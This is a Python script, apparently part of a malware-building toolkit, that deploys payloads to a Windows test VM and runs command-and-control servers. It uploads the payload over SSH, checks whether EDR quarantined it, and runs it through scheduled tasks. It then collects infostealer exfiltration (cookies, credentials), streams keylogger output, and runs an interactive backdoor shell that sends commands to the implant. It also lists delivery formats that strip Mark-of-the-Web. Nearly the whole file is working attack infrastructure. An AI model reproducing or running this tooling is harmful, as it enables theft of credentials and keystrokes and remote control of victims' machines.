#!/usr/bin/env python3
"""Interactive deployment script for malware payload.

Full end-to-end deployment:
- Upload payload to VM via SSH/SFTP
- Start C2 listener (infostealer or backdoor)
- Execute payload on VM
- Collect exfiltrated data into organized output folder

Usage:
    python deploy.py                    # Interactive mode (full flow)
    python deploy.py --method raw       # Deploy specific package
    python deploy.py --serve 8080       # Serve via HTTP
    python deploy.py --c2               # Start C2 listener only
    python deploy.py --list             # List available packages
"""
import argparse
import datetime
import http.server
import os
import re
import socketserver
import struct
import subprocess
import sys
import threading
import time
from pathlib import Path

# Configuration - filled in by assembler
PAYLOAD_NAME = "{{PAYLOAD_NAME}}"
PAYLOAD_TYPE = "{{PAYLOAD_TYPE}}"  # pe, jscript, vbscript, batch
VM_HOST = "localhost"
VM_PORT = 10022
VM_USER = "vmuser"
VM_PASS = "vmuser123"
VM_DEST = r"C:\Users\vmuser\Desktop"
C2_PORT = 9001


def get_available_packages() -> dict:
    """Find available delivery packages in this folder."""
    packages = {}
    script_dir = Path(__file__).parent

    for ext in ['.exe', '.dll', '.cpl', '.js', '.vbs', '.bat', '.ps1']:
        for f in script_dir.glob(f'*{ext}'):
            if f.name != 'deploy.py':
                packages['raw'] = str(f)
                break

    delivery_dir = script_dir / 'delivery'
    if delivery_dir.exists():
        for f in delivery_dir.iterdir():
            if f.suffix == '.iso':
                packages['iso'] = str(f)
            elif f.suffix == '.7z':
                packages['7z'] = str(f)
            elif f.suffix == '.lnk':
                packages['lnk'] = str(f)
            elif f.name.startswith('stager'):
                packages['stager'] = str(f)
            elif f.suffix == '.hta':
                packages['hta'] = str(f)
            elif f.suffix == '.exe' and 'sfx' in f.name.lower():
                packages['sfx'] = str(f)

    return packages


def list_packages():
    """List available packages."""
    packages = get_available_packages()
    if not packages:
        print("No packages found in this folder.")
        return

    print("\nAvailable delivery packages:")
    print("-" * 40)
    for method, path in sorted(packages.items()):
        size = os.path.getsize(path)
        motw = "strips MOTW" if method in ('iso', '7z', 'sfx') else "keeps MOTW"
        print(f"  {method:10} {os.path.basename(path):30} ({size:,} bytes) [{motw}]")


def get_payload_type() -> str:
    """Detect payload type from build_info.txt."""
    script_dir = Path(__file__).parent
    build_info = script_dir / "build_info.txt"
    if build_info.exists():
        content = build_info.read_text()
        if "type: backdoor" in content.lower():
            return "backdoor"
        elif "type: keylogger" in content.lower():
            return "keylogger"
        elif "type: infostealer" in content.lower():
            return "infostealer"
    return "unknown"


def get_exfil_protocol() -> str:
    """Detect exfil protocol from recipe.yaml or source.c."""
    script_dir = Path(__file__).parent

    # Check recipe.yaml first
    recipe_file = script_dir / "recipe.yaml"
    if recipe_file.exists():
        content = recipe_file.read_text()
        if "https_post" in content or "exfil/https" in content:
            return "https"
        if "tcp_direct" in content or "exfil/tcp" in content:
            return "tcp"

    # Check source.c for WINHTTP_FLAG_SECURE (means HTTPS)
    source_file = script_dir / "source.c"
    if source_file.exists():
        content = source_file.read_text()
        if "WINHTTP_FLAG_SECURE" in content:
            return "https"
        if "SOCK_STREAM" in content and "WinHttp" not in content:
            return "tcp"

    return "http"


def get_local_ip() -> str:
    """Get local IP address."""
    import socket
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        return "127.0.0.1"


def ssh_command(cmd: str, timeout: int = 30) -> tuple:
    """Execute SSH command on VM."""
    ssh_cmd = [
        'sshpass', '-p', VM_PASS,
        'ssh', '-o', 'StrictHostKeyChecking=no',
        '-o', f'ConnectTimeout={timeout}',
        '-p', str(VM_PORT),
        f'{VM_USER}@{VM_HOST}',
        cmd
    ]
    try:
        result = subprocess.run(ssh_cmd, capture_output=True, text=True, timeout=timeout)
        stdout = result.stdout.replace('\r', '')
        stderr = result.stderr.replace('\r', '')
        return stdout, stderr, result.returncode
    except subprocess.TimeoutExpired:
        return "", "timeout", -1
    except Exception as e:
        return "", str(e), -1


def upload_payload(package_path: str) -> bool:
    """Upload payload to VM via SFTP."""
    try:
        import paramiko
    except ImportError:
        return upload_via_scp(package_path)

    filename = os.path.basename(package_path)
    remote_path = f"{VM_DEST}\\{filename}"

    print(f"  Uploading {filename}...")

    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(VM_HOST, VM_PORT, VM_USER, VM_PASS, timeout=10)

        sftp = ssh.open_sftp()
        sftp_path = '/' + remote_path.replace('\\', '/')
        sftp.put(package_path, sftp_path)
        sftp.close()
        ssh.close()

        print(f"  Uploaded: {remote_path}")
        return True

    except Exception as e:
        print(f"  Upload error: {e}")
        return False


def upload_via_scp(package_path: str) -> bool:
    """Upload via sshpass/scp (fallback)."""
    filename = os.path.basename(package_path)
    cmd = [
        'sshpass', '-p', VM_PASS,
        'scp', '-P', str(VM_PORT),
        '-o', 'StrictHostKeyChecking=no',
        package_path,
        f'{VM_USER}@{VM_HOST}:{VM_DEST}/{filename}'
    ]
    result = subprocess.run(cmd, capture_output=True, text=True)
    if result.returncode != 0:
        print(f"  SCP failed: {result.stderr}")
        return False
    print(f"  Uploaded: {VM_DEST}\\{filename}")
    return True


def check_quarantine(filename: str) -> bool:
    """Check if payload was quarantined by EDR."""
    remote_path = f"{VM_DEST}\\{filename}"
    stdout, _, _ = ssh_command(
        f'powershell -Command "if(Test-Path \'{remote_path}\'){{(Get-Item \'{remote_path}\').Length}}else{{0}}"'
    )
    try:
        size = int(stdout.strip())
        return size > 0
    except:
        return False


def execute_payload(filename: str) -> bool:
    """Execute payload on VM via schtasks (detached)."""
    remote_path = f"{VM_DEST}\\{filename}"

    ssh_command(f'schtasks /create /tn deploy_run /tr "{remote_path}" /sc once /st 00:00 /f')
    ssh_command('schtasks /run /tn deploy_run')
    ssh_command('schtasks /delete /tn deploy_run /f')

    print(f"  Executed via schtasks")
    return True


# =============================================================================
# INFOSTEALER C2 - Collects exfil data and saves to organized folder
# =============================================================================

class InfostealerC2Handler(http.server.BaseHTTPRequestHandler):
    """HTTP handler for infostealer exfil collection."""

    exfil_data = bytearray()
    received_chunks = 0

    def do_POST(self):
        length = int(self.headers.get("Content-Length", 0))
        if length:
            chunk = self.rfile.read(length)
            InfostealerC2Handler.exfil_data.extend(chunk)
            InfostealerC2Handler.received_chunks += 1
            print(f"\r  Received chunk {InfostealerC2Handler.received_chunks}: {len(chunk):,} bytes (total: {len(InfostealerC2Handler.exfil_data):,})", end="", flush=True)

        self.send_response(200)
        self.send_header("Content-Length", "2")
        self.end_headers()
        self.wfile.write(b"OK")

    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-Length", "2")
        self.end_headers()
        self.wfile.write(b"OK")

    def log_message(self, *args):
        pass


def parse_exfil_sections(data: bytes, out_dir: Path):
    """Parse exfil data into sections and save to files."""
    out_dir.mkdir(exist_ok=True)

    text_data = data.decode('utf-8', errors='replace')

    section_pattern = re.compile(r'===\s*([A-Z_]+)\s*===')
    sections = []

    matches = list(section_pattern.finditer(text_data))

    if not matches:
        raw_file = out_dir / "raw_exfil.bin"
        raw_file.write_bytes(data)
        print(f"  No sections found, saved raw data to {raw_file}")
        return

    for i, match in enumerate(matches):
        section_name = match.group(1).lower()
        start = match.end()
        end = matches[i + 1].start() if i + 1 < len(matches) else len(text_data)
        content = text_data[start:end].strip()
        sections.append((section_name, content))

    for section_name, content in sections:
        if not content:
            continue

        is_binary = '\x00' in content or sum(1 for c in content[:1000] if ord(c) > 127 or ord(c) < 32 and c not in '\n\r\t') > len(content[:1000]) * 0.3

        if is_binary or section_name in ('cookies', 'credentials', 'sqlite'):
            ext = '.bin'
        else:
            ext = '.txt'

        filename = out_dir / f"{section_name}{ext}"

        if ext == '.bin':
            filename.write_bytes(content.encode('utf-8', errors='replace'))
        else:
            filename.write_text(content)

        print(f"    {section_name}: {len(content):,} bytes -> {filename.name}")


def run_infostealer_c2(port: int, timeout: int, out_dir: Path, protocol: str = "http") -> bool:
    """Run C2 listener for infostealer, collect and parse exfil."""
    import socket
    import ssl
    from http.server import HTTPServer

    # TCP raw socket mode
    if protocol == "tcp":
        return run_tcp_listener(port, timeout, out_dir)

    InfostealerC2Handler.exfil_data = bytearray()
    InfostealerC2Handler.received_chunks = 0

    use_https = protocol == "https"
    proto_str = "HTTPS" if use_https else "HTTP"
    print(f"\n  C2 {proto_str} listening on 0.0.0.0:{port}")
    print(f"  Waiting for exfil (timeout: {timeout}s)...")

    srv = HTTPServer(("0.0.0.0", port), InfostealerC2Handler)

    if use_https:
        # Generate self-signed cert on the fly
        script_dir = Path(__file__).parent
        cert_file = script_dir / "server.pem"
        if not cert_file.exists():
            print("  Generating self-signed certificate...")
            subprocess.run([
                "openssl", "req", "-x509", "-newkey", "rsa:2048",
                "-keyout", str(cert_file), "-out", str(cert_file),
                "-days", "1", "-nodes", "-batch",
                "-subj", "/CN=localhost"
            ], capture_output=True)
        context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        context.load_cert_chain(str(cert_file))
        srv.socket = context.wrap_socket(srv.socket, server_side=True)

    srv.timeout = 1

    deadline = time.monotonic() + timeout
    try:
        while time.monotonic() < deadline:
            srv.handle_request()
            if InfostealerC2Handler.received_chunks > 0 and time.monotonic() > deadline - timeout + 10:
                time.sleep(3)
                break
    except KeyboardInterrupt:
        print("\n  C2 stopped by user")

    srv.server_close()

    data = bytes(InfostealerC2Handler.exfil_data)
    if not data:
        print("\n  No data received")
        return False

    print(f"\n\n  Total received: {len(data):,} bytes in {InfostealerC2Handler.received_chunks} chunks")
    print(f"\n  Parsing exfil data...")

    exfil_dir = out_dir / "exfil"
    parse_exfil_sections(data, exfil_dir)

    raw_file = exfil_dir / "raw_complete.bin"
    raw_file.write_bytes(data)
    print(f"    Complete raw data -> {raw_file.name}")

    return True


def run_tcp_listener(port: int, timeout: int, out_dir: Path) -> bool:
    """Run raw TCP listener for tcp_direct exfil."""
    import socket

    print(f"\n  C2 TCP listening on 0.0.0.0:{port}")
    print(f"  Waiting for exfil (timeout: {timeout}s)...")

    data = bytearray()

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind(("0.0.0.0", port))
    sock.listen(1)
    sock.settimeout(timeout)

    try:
        conn, addr = sock.accept()
        print(f"  Connection from {addr[0]}:{addr[1]}")
        conn.settimeout(30)

        while True:
            try:
                chunk = conn.recv(4096)
                if not chunk:
                    break
                data.extend(chunk)
                print(f"\r  Received: {len(data):,} bytes", end="", flush=True)
            except socket.timeout:
                break

        conn.close()
    except socket.timeout:
        print("\n  No connection received")
    finally:
        sock.close()

    if not data:
        print("\n  No data received")
        return False

    print(f"\n\n  Total received: {len(data):,} bytes")
    print(f"\n  Parsing exfil data...")

    exfil_dir = out_dir / "exfil"
    parse_exfil_sections(data, exfil_dir)

    raw_file = exfil_dir / "raw_complete.bin"
    raw_file.write_bytes(data)
    print(f"    Complete raw data -> {raw_file.name}")

    return True


# =============================================================================
# BACKDOOR C2 - Interactive shell
# =============================================================================

CMD_HEARTBEAT = 0x01
CMD_SYSINFO = 0x02
CMD_PROCESSES = 0x03
CMD_EXEC = 0x0A
CMD_EXIT = 0x0D
CMD_NOOP = 0xFF

CMD_NAMES = {
    0x01: "HEARTBEAT", 0x02: "SYSINFO", 0x03: "PROCESSES",
    0x0A: "EXEC", 0x0D: "EXIT", 0xFF: "NOOP",
}

CMD_LOOKUP = {
    "sysinfo": (CMD_SYSINFO, ""), "ps": (CMD_PROCESSES, ""),
    "processes": (CMD_PROCESSES, ""), "exit": (CMD_EXIT, ""),
    "quit": (CMD_EXIT, ""),
}

c2_pending_cmd = None
c2_pending_lock = threading.Lock()
c2_results = []
c2_running = True
c2_beacon_received = False


class BackdoorC2Handler(http.server.BaseHTTPRequestHandler):
    """HTTP handler for backdoor C2."""
    global c2_beacon_received

    def do_POST(self):
        global c2_pending_cmd, c2_beacon_received
        length = int(self.headers.get("Content-Length", 0))
        body = self.rfile.read(length) if length else b""

        if self.path == "/beacon":
            c2_beacon_received = True
            with c2_pending_lock:
                if c2_pending_cmd is not None:
                    cmd_id, arg = c2_pending_cmd
                    c2_pending_cmd = None
                else:
                    cmd_id, arg = CMD_NOOP, b""

            if cmd_id != CMD_NOOP:
                name = CMD_NAMES.get(cmd_id, hex(cmd_id))
                arg_str = f" ({arg.decode()})" if arg else ""
                print(f"\r  >> sending {name}{arg_str}")
                print("C2> ", end="", flush=True)

            arg_bytes = arg if isinstance(arg, bytes) else arg.encode()
            resp = struct.pack("<II", cmd_id, len(arg_bytes)) + arg_bytes
            self.send_response(200)
            self.send_header("Content-Length", str(len(resp)))
            self.end_headers()
            self.wfile.write(resp)

        elif self.path == "/result":
            if len(body) >= 8:
                cmd_id, plen = struct.unpack("<II", body[:8])
                payload = body[8:8+plen] if plen else b""
                text = payload.decode("utf-8", errors="replace")
                c2_results.append((cmd_id, text))
                name = CMD_NAMES.get(cmd_id, f"0x{cmd_id:02x}")
                print(f"\r\n{'='*60}")
                print(f"  {name} ({len(payload)} bytes)")
                print(f"{'='*60}")
                print(text[:4000])
                if len(text) > 4000:
                    print(f"  ... ({len(text) - 4000} more bytes)")
                print("C2> ", end="", flush=True)
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b"ok")
        else:
            self.send_response(404)
            self.end_headers()

    def log_message(self, *args):
        pass


def c2_parse_cmd(line: str):
    """Parse user command for backdoor C2."""
    line = line.strip()
    if not line:
        return None
    parts = line.split(None, 1)
    verb = parts[0].lower()
    arg = parts[1] if len(parts) > 1 else ""

    if verb in CMD_LOOKUP:
        cmd_id, _ = CMD_LOOKUP[verb]
        return (cmd_id, arg.encode() if arg else b"")
    elif verb in ("exec", "run", "cmd", "shell"):
        if not arg:
            print("  usage: exec <command>")
            return None
        return (CMD_EXEC, arg.encode())
    elif verb == "help":
        print("""
  Commands (sent on next beacon):
    sysinfo          System info
    ps / processes   Running processes
    exec <cmd>       Execute cmd.exe /c <cmd>
    exit / quit      Kill implant
    help             This message

  Anything else sent as: exec <your input>
""")
        return None
    else:
        return (CMD_EXEC, line.encode())


def c2_input_loop():
    """Read commands from user for backdoor C2."""
    global c2_pending_cmd, c2_running
    while c2_running:
        try:
            line = input("C2> ")
        except (EOFError, KeyboardInterrupt):
            print("\nShutting down C2...")
            c2_running = False
            return
        parsed = c2_parse_cmd(line)
        if parsed:
            with c2_pending_lock:
                c2_pending_cmd = parsed
            print(f"  queued: {CMD_NAMES.get(parsed[0], hex(parsed[0]))}")


def run_backdoor_c2(port: int, out_dir: Path):
    """Run interactive C2 for backdoor."""
    global c2_running, c2_beacon_received
    from http.server import HTTPServer

    c2_running = True
    c2_beacon_received = False

    print(f"\n{'='*60}")
    print(f"  BACKDOOR C2 - Interactive Shell")
    print(f"  Port: {port}")
    print(f"  Waiting for first beacon...")
    print(f"{'='*60}")
    print("\nCommands: sysinfo, ps, exec <cmd>, exit, help\n")

    srv = HTTPServer(("0.0.0.0", port), BackdoorC2Handler)
    srv.timeout = 1

    t = threading.Thread(target=c2_input_loop, daemon=True)
    t.start()

    try:
        while c2_running:
            srv.handle_request()
    except KeyboardInterrupt:
        print("\nC2 stopped.")

    c2_running = False
    srv.server_close()

    if c2_results:
        results_dir = out_dir / "c2_results"
        results_dir.mkdir(exist_ok=True)
        for i, (cmd_id, text) in enumerate(c2_results, 1):
            name = CMD_NAMES.get(cmd_id, f"0x{cmd_id:02x}")
            (results_dir / f"{i}_{name.lower()}.txt").write_text(text)
        print(f"\n  Saved {len(c2_results)} results to {results_dir}/")


# =============================================================================
# KEYLOGGER C2 - Stream collection
# =============================================================================

def run_keylogger_c2(port: int, timeout: int, out_dir: Path):
    """Run C2 for keylogger - stream to file."""
    print(f"\n  Keylogger C2 on port {port}")
    print(f"  Streaming to {out_dir}/keylog.txt")
    print(f"  Press Ctrl+C to stop\n")

    out_dir.mkdir(exist_ok=True)
    log_file = out_dir / "keylog.txt"

    class KeylogHandler(http.server.BaseHTTPRequestHandler):
        def do_POST(self):
            length = int(self.headers.get("Content-Length", 0))
            if length:
                data = self.rfile.read(length).decode('utf-8', errors='replace')
                with open(log_file, 'a') as f:
                    f.write(data)
                print(data, end="", flush=True)
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b"OK")

        def log_message(self, *args):
            pass

    from http.server import HTTPServer
    srv = HTTPServer(("0.0.0.0", port), KeylogHandler)

    try:
        srv.serve_forever()
    except KeyboardInterrupt:
        print(f"\n\n  Saved to {log_file}")

    srv.server_close()


# =============================================================================
# MAIN DEPLOYMENT FLOW
# =============================================================================

def cleanup_vm(filename: str):
    """Clean up payload and processes from VM."""
    print("\n  Cleaning up VM...")

    basename = Path(filename).stem
    remote_path = f"{VM_DEST}\\{filename}"

    ssh_command(f'taskkill /f /im "{filename}"')
    ssh_command(f'del /f "{remote_path}"')
    ssh_command(f'reg delete "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "{basename}" /f')
    ssh_command('schtasks /delete /tn deploy_run /f')

    print("  VM cleaned up")


def full_deploy(package_path: str, c2_port: int, c2_timeout: int = 60):
    """Full deployment: upload -> check -> execute -> C2 -> collect -> cleanup."""
    script_dir = Path(__file__).parent
    payload_type = get_payload_type()
    exfil_protocol = get_exfil_protocol()
    filename = os.path.basename(package_path)

    print(f"\n{'='*60}")
    print(f"  FULL DEPLOYMENT")
    print(f"  Payload: {filename}")
    print(f"  Type: {payload_type}")
    print(f"  Exfil: {exfil_protocol.upper()}")
    print(f"  Target: {VM_HOST}:{VM_PORT}")
    print(f"  C2 Port: {c2_port}")
    print(f"{'='*60}\n")

    # Step 1: Check VM
    print("[1/6] Checking VM connectivity...")
    stdout, stderr, rc = ssh_command("echo VM_ALIVE")
    if "VM_ALIVE" not in stdout:
        print(f"  FAIL: Cannot reach VM ({stderr})")
        return False
    print("  OK")

    # Step 2: Upload
    print(f"\n[2/6] Uploading payload...")
    if not upload_payload(package_path):
        return False

    # Step 3: Check quarantine
    print(f"\n[3/6] Checking EDR quarantine...")
    time.sleep(3)
    if not check_quarantine(filename):
        print("  FAIL: Payload was QUARANTINED by EDR")
        ssh_command('powershell -Command "Get-MpThreatDetection | Select-Object -Last 1"')
        return False
    print("  OK - Payload survived EDR")

    # Step 4: Start C2 in background thread BEFORE execution
    print(f"\n[4/6] Starting C2 listener...")
    import threading

    c2_result = {"success": False}

    def run_c2():
        if payload_type == "backdoor":
            run_backdoor_c2(c2_port, script_dir)
        elif payload_type == "keylogger":
            run_keylogger_c2(c2_port, c2_timeout, script_dir)
        else:
            c2_result["success"] = run_infostealer_c2(c2_port, c2_timeout, script_dir, protocol=exfil_protocol)

    c2_thread = threading.Thread(target=run_c2, daemon=True)
    c2_thread.start()
    time.sleep(2)  # Give C2 time to start listening

    # Step 5: Execute
    print(f"\n[5/6] Executing payload...")
    execute_payload(filename)

    # Wait for C2 to finish collecting
    c2_thread.join(timeout=c2_timeout + 10)

    # Step 6: Cleanup
    print(f"\n[6/6] Cleanup...")
    cleanup_vm(filename)

    print(f"\n{'='*60}")
    print("  Deployment complete!")
    print(f"{'='*60}")

    return True


def serve_http(port: int = 8080):
    """Serve this folder via HTTP."""
    script_dir = Path(__file__).parent
    os.chdir(script_dir)

    handler = http.server.SimpleHTTPRequestHandler
    with socketserver.TCPServer(("0.0.0.0", port), handler) as httpd:
        local_ip = get_local_ip()
        print(f"\nServing {script_dir} on:")
        print(f"  http://localhost:{port}/")
        print(f"  http://{local_ip}:{port}/")
        print("\nPress Ctrl+C to stop...")
        try:
            httpd.serve_forever()
        except KeyboardInterrupt:
            print("\nStopped.")


def interactive_mode():
    """Interactive deployment menu."""
    packages = get_available_packages()
    payload_type = get_payload_type()

    if not packages:
        print("No packages found. Run the assembler first.")
        return

    print(f"\n{'='*60}")
    print(f"  Payload: {PAYLOAD_NAME} ({PAYLOAD_TYPE})")
    print(f"  Type: {payload_type}")
    print(f"{'='*60}")

    list_packages()

    print("\nOptions:")
    print("  1. Full Deploy (upload -> execute -> C2 -> collect)")
    print("  2. Start C2 only")
    print("  3. Serve via HTTP")
    print("  4. Exit")

    choice = input("\nChoice [1-4]: ").strip()

    if choice == '1':
        methods = list(packages.keys())
        if len(methods) == 1:
            method = methods[0]
            print(f"\nUsing: {method}")
        else:
            print("\nSelect delivery method:")
            for i, m in enumerate(methods, 1):
                print(f"  {i}. {m}")
            try:
                idx = int(input(f"\nChoice [1-{len(methods)}]: ").strip()) - 1
                if 0 <= idx < len(methods):
                    method = methods[idx]
                else:
                    print("Invalid choice.")
                    return
            except ValueError:
                print("Invalid choice.")
                return

        full_deploy(packages[method], C2_PORT)

    elif choice == '2':
        script_dir = Path(__file__).parent
        if payload_type == "backdoor":
            run_backdoor_c2(C2_PORT, script_dir)
        elif payload_type == "keylogger":
            run_keylogger_c2(C2_PORT, 300, script_dir)
        else:
            run_infostealer_c2(C2_PORT, 120, script_dir)

    elif choice == '3':
        port = input("Port [8080]: ").strip() or "8080"
        serve_http(int(port))

    elif choice == '4':
        return
    else:
        print("Invalid choice.")


def main():
    parser = argparse.ArgumentParser(description="Deploy malware payload")
    parser.add_argument("--method", choices=['raw', 'iso', '7z', 'lnk', 'sfx', 'stager', 'hta'],
                        help="Delivery method - runs full deploy flow")
    parser.add_argument("--serve", type=int, metavar="PORT",
                        help="Serve folder via HTTP on specified port")
    parser.add_argument("--list", action="store_true", help="List available packages")
    parser.add_argument("--c2", action="store_true", help="Start C2 listener only")
    parser.add_argument("--c2-port", type=int, default=C2_PORT, help=f"C2 port (default: {C2_PORT})")
    parser.add_argument("--c2-timeout", type=int, default=60, help="C2 timeout in seconds (default: 60)")

    args = parser.parse_args()

    if args.list:
        list_packages()
        return

    if args.c2:
        script_dir = Path(__file__).parent
        payload_type = get_payload_type()
        if payload_type == "backdoor":
            run_backdoor_c2(args.c2_port, script_dir)
        elif payload_type == "keylogger":
            run_keylogger_c2(args.c2_port, args.c2_timeout, script_dir)
        else:
            run_infostealer_c2(args.c2_port, args.c2_timeout, script_dir)
        return

    if args.serve:
        serve_http(args.serve)
        return

    if args.method:
        packages = get_available_packages()
        if args.method not in packages:
            print(f"Package not found: {args.method}")
            print("Available:", list(packages.keys()))
            sys.exit(1)
        full_deploy(packages[args.method], args.c2_port, args.c2_timeout)
        return

    interactive_mode()


if __name__ == "__main__":
    main()
